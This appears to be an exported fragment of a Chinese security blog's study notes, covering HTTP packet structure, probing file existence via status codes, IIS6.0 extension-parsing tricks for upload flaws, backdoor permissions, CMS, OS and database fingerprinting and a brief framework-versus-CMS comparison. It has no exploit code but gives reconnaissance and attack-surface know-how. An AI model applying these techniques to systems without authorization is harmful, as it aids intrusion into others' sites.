<li>HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</li>
<li>POST：服务器接受被写入客户端输出流中的数据请求</li>
<li>PUT：服务器保存请求数据作为指定URL新内容中的请求</li>
<li>DELETE：服务器删除URL中命令的资源的请求</li>
<li>OPTIONS：关于服务器支持的请求方法信息的请求</li>
<li>TRACE：web服务器反馈http请求和其头标的请求</li>
<li>CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</li>
</ul>
<h3 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h3><p>一些键值对，浏览器和web服务器之间都可以发送，有特定的某种含义</p>
<p>由关键字/值对组成，每行一队，关键字和值用冒号分隔</p>
<ul>
<li><p>Host：主机或域名地址</p>
</li>
<li><p>Accept：浏览器或其他客户可以接受的MIME文件格式</p>
</li>
<li><p>User-Agent：客户浏览器的名称</p>
</li>
<li><p>Accept-Language：浏览器可以接受的语言种类</p>
</li>
<li><p>Connection：用于告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值，这样，当浏览器需要多个文件时（比如一个HTML文件和相关的图形文件），不需要每次都建立连接</p>
</li>
<li><p>Cookie：浏览器使用这个属性向服务器发送Cookie（Cookie是在浏览器中寄存的小型数据体，可记载和服务器相关的用户信息，也可以用于实现会话功能）</p>
</li>
<li><p>Referer：表名产生请求的网页URL</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210606213017133.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210606213017133"></p>
</li>
<li><p>Accept-Charest：指出浏览器可以接受的字符编码</p>
</li>
<li><p>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传输速度。浏览器在接收到web响应后先解码，然后再检查文件格式</p>
</li>
</ul>
<h3 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h3><p>请求头和请求体之间用一个空行隔开</p>
<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标</p>
<h3 id="4-请求体"><a href="#4-请求体" class="headerlink" title="4.请求体"></a>4.请求体</h3><p>要发送的数据（一般在POST提交）</p>
<h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"># 状态码“200” 即存在文件</span><br><span class="line">Bdpagetype: 1</span><br><span class="line">Bdqid: 0x9badd8bf000a1e1a</span><br><span class="line">Cache-Control: private</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Date: Sun, 06 Jun 2021 13:48:46 GMT</span><br><span class="line">Expires: Sun, 06 Jun 2021 13:48:46 GMT</span><br><span class="line">Server: BWS/1.1</span><br><span class="line">Set-Cookie: BDSVRTM=16; path=/</span><br><span class="line">Set-Cookie: BD_HOME=1; path=/</span><br><span class="line">Set-Cookie: H_PS_PSSID=31253_33848_33773_33607_26350_22159; path=/; domain=.baidu.com</span><br><span class="line">Strict-Transport-Security: max-age=172800</span><br><span class="line">Traceid: 1622987326076983860211217860561700789786</span><br><span class="line">X-Ua-Compatible: IE=Edge,chrome=1</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>

<p>一个响应与由四个部分组成：状态行、响应头标、空行、响应数据</p>
<h3 id="1-状态行"><a href="#1-状态行" class="headerlink" title="1.状态行"></a>1.状态行</h3><p>协议版本、数字形式的状态码和状态描述</p>
<h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><p><a href="https://baike.baidu.com/item/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/5053660?fr=aladdin">状态码百度百科</a></p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210606221704930.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210606221704930"></p>
<p>1XX：请求已被收到，需要继续处理</p>
<p>2XX：请求已成功</p>
<p>3XX：重定向，需进一步操作才能完成请求</p>
<p>4XX：客户端错误</p>
<p>5XX：服务器错误</p>
<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><ul>
<li><p>200    存在文件</p>
</li>
<li><p>3XX    存在文件夹</p>
</li>
<li><p>403    存在文件夹</p>
</li>
<li><p>404    不存在文件及文件夹</p>
</li>
<li><p>500    均可能存在</p>
<p>通过状态码判断文件存在情况</p>
</li>
</ul>
<h3 id="2-响应头标"><a href="#2-响应头标" class="headerlink" title="2.响应头标"></a>2.响应头标</h3><p>服务器类型、日期、长度、内容类型</p>
<h3 id="3-空行-1"><a href="#3-空行-1" class="headerlink" title="3.空行"></a>3.空行</h3><h3 id="4-响应数据"><a href="#4-响应数据" class="headerlink" title="4.响应数据"></a>4.响应数据</h3><p>浏览器会将实体内容中的数据取出来，生成相应的页面</p>
<h2 id="域名与IP地址"><a href="#域名与IP地址" class="headerlink" title="域名与IP地址"></a>域名与IP地址</h2><p>利用IP地址访问能访问利用域名访问访问到的上一级目录</p>
<p>网站构建时，域名下的目录可能是对应的某个文件夹，而IP地址访问的是WWW的根目录</p>
<p>即域名访问虽然能访问一个文件夹下的所有目录，但如果利用IP地址访问的话，能够访问到其上一级目录，能访问到更多东西</p>
<p>利用IP更能扫描到一些网站敏感信息或备份信息</p>
<h2 id="文件后缀解析"><a href="#文件后缀解析" class="headerlink" title="文件后缀解析"></a>文件后缀解析</h2><p>网站搭建时，每一个文件扩展名都可对应一个可执行文件，该文件用来指明要如何解析具有该拓展名的文件</p>
<p>有默认对应的解析，亦有自己添加或修改的</p>
<p>这便是导致有些文件能够被解析有些不能被解析的原因</p>
<p>不同的后缀可以对应相同的解析方式</p>
<p>例如：在IIS6.0下，.cer .cdx .asa都被解析成.asp文件，原因即是这几种扩展名都是使用同一个asp.dll文件来执行</p>
<p>这可运用于文件上传漏洞，修改文件后缀，文件上传后解析方式不变</p>
<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ul>
<li>后门是否给予执行权限</li>
<li>后门是否给予操作目录或文件权限</li>
<li>后门是否给予其他用户权限</li>
</ul>
<p>这都是后门应考虑的问题，并不是有后门就能够为所欲为</p>
<h2 id="WEB源码"><a href="#WEB源码" class="headerlink" title="WEB源码"></a>WEB源码</h2><h3 id=""><a href="#" class="headerlink" title=""></a><img "" class="lazyload placeholder" data-original="/img/image-20210609163543316.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210609163543316"></h3><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><h4 id="人工识别"><a href="#人工识别" class="headerlink" title="人工识别"></a>人工识别</h4><p>人工观察识别</p>
<h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h4><p>原理：每个CMS源码会有一个特有的文件，可通过扫描该特有文件是否存在，来判断CMS</p>
<p>字典库：</p>
<p>【特有文件|MD5值】</p>
<p><a href="https://github.com/Lucifer1993/cmsprint">字典库一</a></p>
<p><a href="https://w.ddosi.workers.dev/">字典库二</a></p>
<p>字典库三：自己查！</p>
<p>不推荐：需要不断更新与维护</p>
<h4 id="平台识别"><a href="#平台识别" class="headerlink" title="平台识别"></a>平台识别</h4><p><a href="http://whatweb.bugscaner.com/">在线CMS识别一</a></p>
<p><a href="http://www.xiaodi8.com/?id=182">在线CMS识别二</a></p>
<p>在线CMS识别三：自己查！</p>
<h3 id="从目标识别到源码获取"><a href="#从目标识别到源码获取" class="headerlink" title="从目标识别到源码获取"></a>从目标识别到源码获取</h3><ul>
<li>从框架或CMS入手</li>
</ul>
<p>如：输入一个错误的地址进入报错界面以使浏览器回显其框架</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210613140532707.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210613140532707"></p>
<p>或：通过手动或工具进行识别</p>
<ul>
<li>通过特定文件地址或特定文件名去搜索</li>
</ul>
<p>如：寻找一个特定的文件地址或文件名，进行搜寻</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210613140743699.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210613140743699"></p>
<ul>
<li>源码搜索网站</li>
</ul>
<p>如：菜鸟源码</p>
<ul>
<li>其它渠道</li>
</ul>
<p>如：淘宝、咸鱼等</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞（框架类结构例外），在获取源码后可进行本地安全测试或代码审计，也可分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方式想办法获取</p>
<p>网站如若采用框架开发，找出框架漏洞即可</p>
<p>得到一套程序源码的漏洞，所有以该源码为基础的网站都可对其进行相应的漏洞检测</p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>不同操作系统，结构不同，产生的漏洞不同</p>
<h3 id="常见操作系统识别方法"><a href="#常见操作系统识别方法" class="headerlink" title="常见操作系统识别方法"></a>常见操作系统识别方法</h3><h4 id="1-大小写判断"><a href="#1-大小写判断" class="headerlink" title="1.大小写判断"></a>1.大小写判断</h4><p>如有网站，对网站地址进行大小写替换即可判断：Windows不区别大小写，Linux区别大小写</p>
<h4 id="2-工具判断"><a href="#2-工具判断" class="headerlink" title="2.工具判断"></a>2.工具判断</h4><p>如：nmap探测操作系统：-O命令</p>
<h4 id="3-TTL值判断"><a href="#3-TTL值判断" class="headerlink" title="3.TTL值判断"></a>3.TTL值判断</h4><p>ping一个网址，根据其TTL值判断</p>
<p>但是不一定准确，不推荐</p>
<h3 id="操作系统漏洞影响范围"><a href="#操作系统漏洞影响范围" class="headerlink" title="操作系统漏洞影响范围"></a>操作系统漏洞影响范围</h3><ul>
<li>权限</li>
<li>崩溃</li>
</ul>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>不同数据库，结构不同，漏洞产生会有差异</p>
<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>数据库在运行时会开放一个默认端口，不同数据库端口号是不同的</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210615093831277.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210615093831277"></p>
<h4 id="大胆猜测"><a href="#大胆猜测" class="headerlink" title="大胆猜测"></a>大胆猜测</h4><p>不同脚本与特定数据库会有更好的配合，如下（仅仅是举例，在数据库的选择上还需深思熟虑，而且并不是一一对应关系）：</p>
<p><img "" class="lazyload placeholder" data-original="/img/image-20210615093103955.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210615093103955"></p>
<h2 id="第三方平台或软件"><a href="#第三方平台或软件" class="headerlink" title="第三方平台或软件"></a>第三方平台或软件</h2><p>从第三方平台或软件下手，如phpmyadmin，寻找其漏洞</p>
<h3 id="判断有无使用第三方平台或软件"><a href="#判断有无使用第三方平台或软件" class="headerlink" title="判断有无使用第三方平台或软件"></a>判断有无使用第三方平台或软件</h3><p>端口扫描</p>
<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><p>MD5\    SHA\    ASC\    进制\    时间戳\    URL\    BASE64\    AES\    DES\    UNESCAPE    等等</p>
<h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><p>直接加密\    带salt\    带密码\    带偏移\    带位数\    带模式\    带干扰\    自定义组合    等等</p>
<h3 id="常见解密方式"><a href="#常见解密方式" class="headerlink" title="常见解密方式"></a>常见解密方式</h3><p>枚举\    自定义逆向算法    等等</p>
<h3 id="常规加密算法的特性"><a href="#常规加密算法的特性" class="headerlink" title="常规加密算法的特性"></a>常规加密算法的特性</h3><p>长度位数\    字符规律\    代码分析\    搜索获取    等等</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>数据包</tag>
        <tag>域名与IP地址</tag>
        <tag>文件后缀</tag>
        <tag>后门</tag>
        <tag>WEB源码</tag>
        <tag>操作系统</tag>
        <tag>数据库</tag>
        <tag>第三方平台或软件</tag>
        <tag>加密编码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>框架与CMS的区别</title>
    <url>/2021/%E6%A1%86%E6%9E%B6%E4%B8%8ECMS%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="框架与CMS的区别"><a href="#框架与CMS的区别" class="headerlink" title="框架与CMS的区别"></a>框架与CMS的区别</h1><h2 id="简单区分："><a href="#简单区分：" class="headerlink" title="简单区分："></a>简单区分：</h2><h3 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h3><p>是负责实现整体业务的逻辑，如用户输入什么，应该返回什么</p>
<p>编程语言好比盖房用的砖头，是为最基础的东西</p>
<h3 id="框架与CMS"><a href="#框架与CMS" class="headerlink" title="框架与CMS"></a>框架与CMS</h3><p>两者都是由编程语言写出</p>
<h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p>框架提供主要程序代码和代码目录架构，方便开发者利用其来开发系统</p>
<p>框架为毛坯房，需要去添砖加瓦，该有几间房，该怎么设计等等都可依照自己的喜好修建</p>
<h4 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h4><p>CMS 是已经实现了的内容管理系统网站，用户使用CMS进行网站的二次开发</p>
<p>CMS为商品房，仅需简单装修便可使用，但是原来有几间房、几扇门等等都是已经确定了的东西，不可改变</p>
<h2 id="两者对比"><a href="#两者对比" class="headerlink" title="两者对比"></a>两者对比</h2><p><a class="link"   href="https://my.oschina.net/u/3412071/blog/889229" >引用<i class="fas fa-external-link-alt"></i></a></p>
<p>（以PHP为例）</p>
<h3 id="难度方面"><a href="#难度方面" class="headerlink" title="难度方面"></a>难度方面</h3><p>框架所需的知识含金量高，需对面向对象编程由深入理解，亦需深刻懂得MVC原理、单入口原理、标签解析引擎原理等等，以方便灵活使用框架去开发，适合PHP基础比较全面的人使用</p>
<p>CMS则不同，仅需要懂些许PHP语法还有一些相关的基础性的PHP开发知识，便可依葫芦画瓢使用CMS开发出一个简单的项目（速度较快，但不利于维护）</p>
<h3 id="应用范畴"><a href="#应用范畴" class="headerlink" title="应用范畴"></a>应用范畴</h3><p>框架属于底层的东西，可用来开发任何类型的项目</p>
<p>CMS则在应用范围上由局限性，某些类别的CMS仅适合开发相应类别的项目</p>
<p>如：PHPCMS适合开发文章类型的管理系统，Ecshop适合开发商城类型的项目，Discuz适合开发论坛类型的项目</p>
<p>若是使用Ecshop来开发论坛，那便会有许多地方需要修改，会多走弯路</p>
<p><strong>另外，框架还可以开发CMS出来，但反过来，CMS就不能用来开发框架（会造成性能太低）</strong></p>
<h3 id="开发特点"><a href="#开发特点" class="headerlink" title="开发特点"></a>开发特点</h3><blockquote>
<p>在框架中，你可能看不到一个具体的控制器子类文件，所以基于框架的开发，首先要你自己来写控制器文件，还要安排在什么位置写，这些都有框架自己的规矩，虽然也可以灵活的修改文件夹的位置，但你要麻烦的去寻找为什么。</p>
<p>而CMS等开源系统，这些文件都是帮你写好了的，位置也会帮你安排好，你在那些现成的文件上修修改改基本上就可以了。你会少很多事情。</p>
</blockquote>
<h3 id="灵活性"><a href="#灵活性" class="headerlink" title="灵活性"></a>灵活性</h3><p>框架可以随意项目模块架构，也可随意添加想要的功能</p>
<p>CMS所有东西都是固有的，不方便修改</p>
<h3 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h3><blockquote>
<p>用框架去开发，开发的时候速度慢，但后续修改灵活，同时速度会很快，遇到问题可以马上知道处在哪里了，可谓是“一步到位、一针见血”。</p>
<p>用CMS去开发：开发的时候速度快，但后续修改特别是添加功能模块的时候，就不够灵活，会造成速度很慢，甚至不大可能实现。</p>
<p>打个比方：你用框架开发的项目，开发的时候可能需要2个月，但你后续升级项目，添加个什么功能可能只要1个星期。而你用CMS去开发，开发项目上线可能只要3个星期，但是你升级功能、添加新功能模块、可能也要3个星期甚至更多，还有可能实现不了，或者强加进去会造成该模块性能甚至整个系统的性能大大降低。而且每次升级都是这样。</p>
</blockquote>
]]></content>
      <categories>
        <category>WEB相关</category>
      </categories>
      <tags>
        <tag>CMS</tag>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试-信息收集</title>
    <url>/2021/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="渗透测试-信息收集"><a href="#渗透测试-信息收集" class="headerlink" title="渗透测试-信息收集"></a>渗透测试-信息收集</h1><h2 id="CDN绕过技术"><a href="#CDN绕过技术" class="headerlink" title="CDN绕过技术"></a>CDN绕过技术</h2><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术</p>
<h3 id="CDN的存在判断"><a href="#CDN的存在判断" class="headerlink" title="CDN的存在判断"></a>CDN的存在判断</h3><h4 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h4>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CDN绕过技术</tag>
      </tags>
  </entry>
</search>
